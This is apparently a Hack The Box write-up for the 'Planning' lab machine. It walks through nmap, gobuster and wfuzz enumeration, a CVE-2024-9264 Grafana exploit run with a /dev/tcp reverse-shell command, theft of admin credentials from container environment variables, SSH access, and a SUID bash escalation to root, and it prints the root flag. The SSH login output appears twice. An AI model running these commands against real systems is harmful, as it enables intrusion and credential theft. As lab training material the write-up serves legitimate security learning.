Let's do a port scan
```bash
nmap -p- -T4-min-rate=10000 10.10.11.68            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 13:35 EDT
Nmap scan report for 10.10.11.68
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Lets do a more specific scan on the two open ports...
```bash
nmap -p 22,80 -sC -sV  10.10.11.68            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 13:37 EDT
Nmap scan report for 10.10.11.68
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds
```
Lets enumerate the website
```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://planning.htb -t 100 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://planning.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 178] [--> http://planning.htb/css/]
/img                  (Status: 301) [Size: 178] [--> http://planning.htb/img/]
/js                   (Status: 301) [Size: 178] [--> http://planning.htb/js/]
/lib                  (Status: 301) [Size: 178] [--> http://planning.htb/lib/]
Progress: 20469 / 20470 (100.00%)
```
Nothing of interest lets log in with the given credentials "As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r"
But we have no idea where we can log in so lets enumerate some more..
```bash
wfuzz -u http://planning.htb -H "Host: FUZZ.planning.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 200 --hc 301    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://planning.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                        
=====================================================================

000024093:   302        2 L      2 W        29 Ch       "grafana"                                      

Total time: 65.42401
Processed Requests: 100000
Filtered Requests: 99999
Requests/sec.: 1528.490
```
Now we can use the credentials to log in. My first idea is to search for the version of Grafana being used and try to find a CVE exploit for it..
"Grafana v11.0.0 (83b9528bce)"
https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/
https://github.com/topics/cve-2024-9264

```bash
python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'bash -c "bash -i >& /dev/tcp/10.10.14.163/4444 0>&1"' http://grafana.planning.htb/ 
```
Now we got a shell so lets get run linpeas.sh to get more info. Ok so it seems like we are in a docker enviroment currently..
```bash
root@7ce659d667d7:~# env
env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```
This "GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT! GF_SECURITY_ADMIN_USER=enzo
" def seems interesting..
```bash
ssh enzo@10.10.11.68                
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jul 24 08:37:07 PM UTC 2025

  System load:  0.13              Processes:             559
  Usage of /:   74.6% of 6.30GB   Users logged in:       0
  Memory usage: 50%               IPv4 address for eth0: 10.10.11.68
  Swap usage:   28%

  => There are 276 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

102 updates can be applied immediately.
77 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jul 24 20:37:10 2025 from 10.10.14.163
enzo@planning:~$ 
```
Nice!
```bash
ssh enzo@10.10.11.68                
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jul 24 08:37:07 PM UTC 2025

  System load:  0.13              Processes:             559
  Usage of /:   74.6% of 6.30GB   Users logged in:       0
  Memory usage: 50%               IPv4 address for eth0: 10.10.11.68
  Swap usage:   28%

  => There are 276 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

102 updates can be applied immediately.
77 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jul 24 20:37:10 2025 from 10.10.14.163
enzo@planning:~$ 
```
Nice!
I ran the linpeas script and found bash in /tmp and used 
https://gtfobins.github.io/gtfobins/bash/ 
and got root
```bash
enzo@planning:/tmp$ ./bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
a1bce311186b32892566fab07b277ab7
bash-5.2# 
```
This was easy and fun experience.
